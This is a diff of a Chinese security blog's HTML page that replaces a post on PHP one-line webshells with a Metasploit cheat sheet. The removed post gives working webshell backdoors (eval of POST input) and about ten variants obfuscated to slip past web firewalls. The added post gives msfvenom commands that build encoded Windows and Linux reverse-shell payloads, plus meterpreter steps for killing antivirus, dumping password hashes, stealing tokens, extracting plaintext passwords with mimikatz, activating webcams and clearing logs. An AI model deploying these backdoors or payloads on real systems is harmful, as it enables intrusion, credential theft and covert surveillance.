@@ -15,21 +15,20 @@
 
 
 
-<meta name="description" content="一句话木马简介一句话木马就是一段简单的代码，就这短短的一行代码，就能做到和大马相当的功能。一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用。">
+<meta name="description" content="1、文件目录目录所在位置：/usr/share/metasploit-framework/">
 <meta property="og:type" content="article">
-<meta property="og:title" content="浅谈一句话木马">
-<meta property="og:url" content="http://yoursite.com/2019/12/21/浅谈php一句话木马/index.html">
+<meta property="og:title" content="Metasploit">
+<meta property="og:url" content="http://yoursite.com/2020/07/26/内网渗透之Metasploit/index.html">
 <meta property="og:site_name" content="obsetear">
-<meta property="og:description" content="一句话木马简介一句话木马就是一段简单的代码，就这短短的一行代码，就能做到和大马相当的功能。一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用。">
+<meta property="og:description" content="1、文件目录目录所在位置：/usr/share/metasploit-framework/">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/webshell/shell1.jpg">
-<meta property="og:image" content="http://yoursite.com/webshell/shell2.jpg">
-<meta property="og:image" content="http://yoursite.com/webshell/shell3.jpg">
-<meta property="og:updated_time" content="2020-02-24T13:42:13.511Z">
+<meta property="og:image" content="http://yoursite.com/internet/msf1.jpg">
+<meta property="og:image" content="http://yoursite.com/internet/msf2.jpg">
+<meta property="og:updated_time" content="2020-07-27T11:27:19.039Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="浅谈一句话木马">
-<meta name="twitter:description" content="一句话木马简介一句话木马就是一段简单的代码，就这短短的一行代码，就能做到和大马相当的功能。一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用。">
-<meta name="twitter:image" content="http://yoursite.com/webshell/shell1.jpg">
+<meta name="twitter:title" content="Metasploit">
+<meta name="twitter:description" content="1、文件目录目录所在位置：/usr/share/metasploit-framework/">
+<meta name="twitter:image" content="http://yoursite.com/internet/msf1.jpg">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -61,7 +60,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>浅谈一句话木马 | obsetear</title>
+<title>Metasploit | obsetear</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -261,11 +260,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-浅谈php一句话木马" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-内网渗透之Metasploit" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/12/21/浅谈php一句话木马/" class="article-date">
-      <time datetime="2019-12-20T16:00:00.000Z" itemprop="datePublished">2019-12-21</time>
+      <a href="/2020/07/26/内网渗透之Metasploit/" class="article-date">
+      <time datetime="2020-07-25T16:00:00.000Z" itemprop="datePublished">2020-07-26</time>
 </a>
 
 
@@ -280,7 +279,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      浅谈一句话木马
+      Metasploit
     </h1>
   
 
@@ -297,61 +296,164 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="一句话木马简介"><a href="#一句话木马简介" class="headerlink" title="一句话木马简介"></a>一句话木马简介</h2><p>一句话木马就是一段简单的代码，就这短短的一行代码，就能做到和大马相当的功能。一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用。</p>
-<a id="more"></a>
+        <h2 id="1、文件目录"><a href="#1、文件目录" class="headerlink" title="1、文件目录"></a>1、文件目录</h2><pre><code>目录所在位置：/usr/share/metasploit-framework/</code></pre><a id="more"></a>    
+<pre><code>data目录：里面存放一些可编辑的文件
 
-<h2 id="一句话木马工作原理"><a href="#一句话木马工作原理" class="headerlink" title="一句话木马工作原理"></a>一句话木马工作原理</h2><p><code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code><br>这是php的一句话后门中最普遍的一种。它的工作原理是：<br>首先存在一个名为<code>shell</code>的变量，<code>shell</code>的取值为HTTP的POST方式。Web服务器对<code>shell</code>取值以后，然后通过eval()函数执行<code>shell</code>里面的内容。</p>
-<p>实例：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&apos;shell&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
+documentation目录：文档目录，里面存放一些相关文档
 
-<p>将以上代码写入webshell.php文件中然后放在站点目录下通过浏览器访问，以POST方式传入<code>shell=phpinfo();</code><br><img src="/webshell/shell1.jpg"><br>也可以用蚁剑或菜刀等工具连接（我这里用的是蚁剑）：<br>在url地址框中输入<code>http://127.0.0.1/webshell.php</code>，在连接密码框中输入<code>shell</code><br><img src="/webshell/shell2.jpg"><br>然后就可以看到目标站点目录下的文件了<br><img src="/webshell/shell3.jpg"></p>
-<h2 id="一句话木马的多种变形"><a href="#一句话木马的多种变形" class="headerlink" title="一句话木马的多种变形"></a>一句话木马的多种变形</h2><p>一般的php一句话后门很容易被网站防火墙waf拦截，而waf通常通过判断关键字来辨别一句话木马，要想绕过waf就需要对木马进行一些变形。</p>
-<p><strong>php变量</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a = &quot;assert&quot;;</span><br><span class="line">$a(@$_POST[&apos;shell&apos;]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+lib目录：静态连接库目录
 
-<p>第三行使用了变量函数$a，变量储存了函数名asse，便可以直接用变量替代函数名。<br><strong>php变量简单变形1</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$a=&quot;TR&quot;.&quot;Es&quot;.&quot;sA&quot;;  </span><br><span class="line">$b=strtolower($a);  </span><br><span class="line">$c=strrev($b);  </span><br><span class="line">@$c($_POST[&apos;shell&apos;]);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+modules目录：模块目录</code></pre><h2 id="2、基础使用"><a href="#2、基础使用" class="headerlink" title="2、基础使用"></a>2、基础使用</h2><pre><code>msfdb init：初始化并启动msf数据库
 
-<p>使用字符串拼接、大小写混淆、字符串逆序组合而成</p>
-<p><strong>php变量简单变形2</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$a=&quot;AssERT&quot;;  </span><br><span class="line">$b=strtolower($a);  </span><br><span class="line">@$b($_POST[&apos;shell&apos;]);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+msfconsole：开启msf
 
-<p>使用大小写混淆配合字符串转小写函数strtolower组合而成</p>
-<p><strong>PHP可变变量</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$bb=&quot;assert&quot;;</span><br><span class="line">$a=&apos;bb&apos;;</span><br><span class="line">$$aa($_POST[&apos;shell&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+db_status：查看数据库状态
 
-<p>以上代码可表示为<code>$$aa = $($aa) = $ (‘bb’) = $bb = &quot;assert&quot;</code></p>
-<p><strong>自定义函数</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">function fun($a)&#123;  </span><br><span class="line">    @eval($a);  </span><br><span class="line">&#125;  </span><br><span class="line">@fun($_POST[&apos;shell&apos;]);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+help：查看帮助
 
-<p>使用function自定义函数，然后函数来调用eval函数</p>
-<p><strong>create_function函数</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$fun = create_function(&apos;&apos;,$_POST[&apos;shell&apos;]);</span><br><span class="line">$fun();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+exit：退出msf
 
-<p>创建了一个匿名函数，并返回了一个独一无二的函数名，然后再调用此函数</p>
-<p><strong>call_user_func()函数</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@call_user_func(assert,$_POST[&apos;shell&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+show：进行罗列模块
 
-<p>call_user_func()函数的第一个参数是被调动的函数，剩下的参数（可有多个参数）是被调用函数的参数</p>
-<p><strong>base64_decode 函数</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   </span><br><span class="line">$a=base64_decode(&quot;YXNzZXJ0&quot;);  </span><br><span class="line">@a($_POST[&apos;shell&apos;]);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+search：搜索模块
 
-<p><code>YXNzZXJ0</code>是assert的base64编码，<code>base64_decode()</code>是base64解密函数</p>
-<p><strong>preg_replace函数</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   </span><br><span class="line">    function fun()&#123;  </span><br><span class="line">        return $_POST[&apos;shell&apos;];  </span><br><span class="line">    &#125;  </span><br><span class="line">    @preg_replace(&quot;/test/e&quot;, fun(), &quot;test123&quot;);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+back：返回上一级
 
-<p> <code>preg_replace</code> 函数一个参数是一个正则表达式，按照 php的格式，表达式在两个/之间，如果在表达式末尾加上一个 e，则第二个参数就会被当做 php代码执行。</p>
-<p><strong>pares_str函数</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str=&quot;a=eval&quot;;</span><br><span class="line">parse_str($str);</span><br><span class="line">$a($_POST[&apos;shell&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+info：查看模块信息
 
-<p>执行pares_str函数后可以生成一个名为$a，值为”eval”的变量。</p>
-<p><strong>str_replace函数</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a = str_replace(&quot;test&quot;, &quot;&quot;, &quot;astestsert&quot;);</span><br><span class="line">$a($_POST[&apos;shell&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+show options：查看配置
 
-<p>此函数用于将第三个参数中的第一个参数替换为第二个参数</p>
-<p>以上的POST也可替换成GET，但同时shell的传递方式也要改为GET形式，在使用一句话木马时，也可以在前面加一个@来屏蔽错误，增加其隐蔽性。</p>
-<p><strong>总结</strong>：一句话木马的变换方式还有很多种，本小白也是浅浅的总结了一下。</p>
+set：设置一个值
 
+exploit：执行模块
+
+jobs：查看工作
+
+kill：杀死工作
+
+使用kage实现界面化：
+
+    1）启动msf：msfconsole -q -x &apos;load msgrpc ServerHost=0.0.0.0 ServerPort=55552 User=obse Pass=123456&apos;</code></pre><img src="/internet/msf1.jpg">
+
+<pre><code>2）启动kage</code></pre><img src="/internet/msf2.jpg">
+
+<h2 id="3、信息收集"><a href="#3、信息收集" class="headerlink" title="3、信息收集"></a>3、信息收集</h2><pre><code>arp扫描模块 ———— auxiliary/scanner/discovery/arp_sweep
+
+udp扫描模块 ———— auxiliary/scanner/discovery/udp _sweep
+
+端口扫描模块 ———— auxiliary/scanner/portscan/tcp</code></pre><h2 id="4、msfvenom"><a href="#4、msfvenom" class="headerlink" title="4、msfvenom"></a>4、msfvenom</h2><pre><code>**常用参数**
+
+    -l：查看列表
+
+    -p：指定payload
+
+    -f：指定输出格式
+
+    -e: 指定编码方式
+
+    -i：指定编码次数
+
+demo
+
+    windows ———— msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=4444 -e x86/shikata_ ga_nai -i 5 -f exe &gt; 1.exe
+
+    linux ———— msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=4444 -f elf &gt; 1.elf</code></pre><h2 id="5、meterpreter"><a href="#5、meterpreter" class="headerlink" title="5、meterpreter"></a>5、meterpreter</h2><pre><code>**基本操作**
+
+    background:返回
+
+    sessions -l：查看所有会话信息
+
+    sessions -i：与指定的会话进行交互
+
+    pwd：查看目标当前目录
+
+    lpwd：查看本地当前目录
+
+    cd：切换至目标指定目录
+
+    lcd：切换至本机的指定目录
+
+    ls：列出目标的文件
+
+    clearev：清理痕迹
+
+    download：将目标文件下载到本地
+
+    upload：将文件上传到目标
+
+    execute：在目标执行命令的功能
+
+         execute -f 1.exe -H(隐藏执行一个程序)
+
+    ps：列出目标进程
+
+    getuid：查看当前用户的身份
+
+    getprivs: 查看用户的权限
+
+    migrate：进程迁移命令
+
+    getpid：查看木马进程
+
+    shell：进入终端环境 
+
+        chcp 65001:更改编码，防止乱码
+
+    exit：退出终端环境
+
+    idletime:查看目标服务器空闲时间
+
+    sysinfo: 查看目标信息
+
+    kill:杀死目标主机的一个进程
+
+    shutdown:关机
+
+    reboot:重启
+
+    netstat：查看目标ip信息
+
+    getsystem:尝试提权（低版本的系统才能成功）
+
+**meterpreter下run命令的一些用法**
+
+    run killav:杀死杀毒软件
+
+    run hashdump:导出目标机的密码
+
+    run post/windows/wlan/wlan_ profile: 查看wifi密码
+
+    run vnc:实时屏幕监控
+
+    run webcam:开启一个摄像头
+
+    run post/windows/gather/checkvm:查看当前主机是否为虚拟机
+
+    run post/windows/manage/enable_rdp: 开启目标的3389
+
+**token窃取**
+
+    load incognito：加载incognito
+
+    list_tokens -u：列举token
+
+    impersonate_token：窃取一个指定token
+
+    steal_token 3306：从进程中窃取token
+
+**mimikatz模块获取密码**
+
+    load mimikatz：加载mimikatz模块
+
+    msv：获取登录密码的hash值
+
+    kerberos/wdigest/tspkg：抓取明文密码
+
+**更新**
+
+    apt update
+
+    apt install metasploit-framework</code></pre>
       
     </div>
     
@@ -359,13 +461,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/12/21/浅谈php一句话木马/">浅谈一句话木马</a></p>
+        <p><span>本文标题:</span><a href="/2020/07/26/内网渗透之Metasploit/">Metasploit</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">obsem</a></p>
-        <p><span>发布时间:</span>2019-12-21, 00:00:00</p>
-        <p><span>最后更新:</span>2020-02-24, 21:42:13</p>
+        <p><span>发布时间:</span>2020-07-26, 00:00:00</p>
+        <p><span>最后更新:</span>2020-07-27, 19:27:19</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/12/21/浅谈php一句话木马/" title="浅谈一句话木马">http://yoursite.com/2019/12/21/浅谈php一句话木马/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/12/21/浅谈php一句话木马/　　作者: obsem" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2020/07/26/内网渗透之Metasploit/" title="Metasploit">http://yoursite.com/2020/07/26/内网渗透之Metasploit/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2020/07/26/内网渗透之Metasploit/　　作者: obsem" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -377,16 +479,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2020/02/10/文件包含漏洞小结/">
-                    文件包含漏洞小结
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/10/03/宽字节注入/">
-                    宽字节注入
+                <a href="/2020/07/25/内网渗透之windows基础/">
+                    Windows基础
                 </a>
             </div>
         
@@ -398,7 +494,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一句话木马简介"><span class="toc-number">1.</span> <span class="toc-text">一句话木马简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一句话木马工作原理"><span class="toc-number">2.</span> <span class="toc-text">一句话木马工作原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一句话木马的多种变形"><span class="toc-number">3.</span> <span class="toc-text">一句话木马的多种变形</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1、文件目录"><span class="toc-number">1.</span> <span class="toc-text">1、文件目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2、基础使用"><span class="toc-number">2.</span> <span class="toc-text">2、基础使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3、信息收集"><span class="toc-number">3.</span> <span class="toc-text">3、信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4、msfvenom"><span class="toc-number">4.</span> <span class="toc-text">4、msfvenom</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5、meterpreter"><span class="toc-number">5.</span> <span class="toc-text">5、meterpreter</span></a></li></ol>
         
     </div>
     <style>
@@ -434,7 +530,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"浅谈一句话木马　| obsetear　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"Metasploit　| obsetear　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -454,15 +550,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2020/02/10/文件包含漏洞小结/" title="上一篇: 文件包含漏洞小结">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/10/03/宽字节注入/" title="下一篇: 宽字节注入">
+            <a href="/2020/07/25/内网渗透之windows基础/" title="下一篇: Windows基础">
                 <i class="fa fa-angle-right"></i>
             </a>
         
